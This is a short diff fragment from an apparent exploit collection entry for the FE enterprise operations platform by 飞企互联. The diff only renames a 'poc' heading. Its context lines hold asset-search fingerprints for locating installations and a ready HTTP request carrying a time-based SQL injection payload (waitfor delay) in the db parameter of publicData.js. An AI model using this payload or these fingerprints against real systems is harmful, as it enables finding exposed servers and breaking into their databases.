@@ -6,7 +6,7 @@ app="FE-协作平台"
 app="飞企互联-FE企业运营管理平台"
 ```
 
-## poc
+## POC
 ```
 GET /oaerp/ui/common/publicData.js%70?type=getAllTableInfo&db=';waitfor+delay+'0:0:3'-- HTTP/1.1
 Host: ip
